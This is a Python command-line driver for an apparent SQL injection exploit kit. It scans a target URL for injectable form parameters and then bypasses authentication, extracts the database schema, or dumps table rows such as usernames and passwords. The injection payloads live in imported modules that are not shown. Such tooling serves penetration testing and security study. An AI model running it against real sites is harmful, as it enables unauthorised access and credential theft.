import argparse
import sys
from exploit_kit.scanner import verify_execution, run_scanner
from exploit_kit.client import APIClient
from exploit_kit.modules.bypass import AuthBypasser
from exploit_kit.modules.schema import SchemaExtractor
from exploit_kit.modules.data import DataExtractor

def main():
    parser = argparse.ArgumentParser(description="SQLi Tester")
    parser.add_argument("-u", "--url", required=True, help="Target URL(e.g., http://192.168.233.130)")
    parser.add_argument("-p", "--param", default=None, help="Target parameter name to inject (e.g., email, username)")
    parser.add_argument("-m", "--mode", choices=["bypass", "schema", "data"], default="bypass",
                        help="Execution mode: 'bypass' for authentication bypass. 'schema' for Schema extraction. 'data' for record. (default: bypass)")

    # -m data
    parser.add_argument("-D", "--db", help="Target database/schema name (e.g., public)")
    parser.add_argument("-T", "--table", help="Target table name to dump (e.g., users)")
    parser.add_argument("-C", "--columns", help="Comma-separated column names (e.g., username,password)")
    parser.add_argument("--limit", type=int, default=20, help="Max number of rows to dump (default: 20)")

    args = parser.parse_args()

    if args.mode == "data" and not args.table:
        parser.error("Mode 'data' requires -T/--table option.")

    print(f"[*] Target URL: {args.url}")
    print(f"[*] Mode: {args.mode.upper()}")

    try:
        client = APIClient(base_url=args.url)
        target_param = args.param

        if target_param:
            print(f"[*] Inject Param (Manual Mode): {args.param}")
            is_vulnerable = verify_execution(client, target_param=args.param)
            if not is_vulnerable:
                print("[!] SQL injection verification failed. Skipping exploit modules.")
                sys.exit(0)

        else:
            print("[*] Inject Param (Auto-Scan Mode): Parameter not specified. Scanning form input Automatically...")
            target_param = run_scanner(client)
            if not target_param:
                sys.exit(0)

        if args.mode == "bypass":
            executor = AuthBypasser(client, target_param=target_param)
        elif args.mode == "schema":
            executor = SchemaExtractor(client, target_param=target_param)
        elif args.mode == "data":
            target_cols = [c.strip() for c in args.columns.split(",")] if args.columns else None
            executor = DataExtractor(
                client,
                target_param=target_param,
                target_db=args.db,
                target_table=args.table,
                target_cols=target_cols,
                limit=args.limit
            )

        executor.run()

    except ValueError as e:
        print(f"ValueError: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
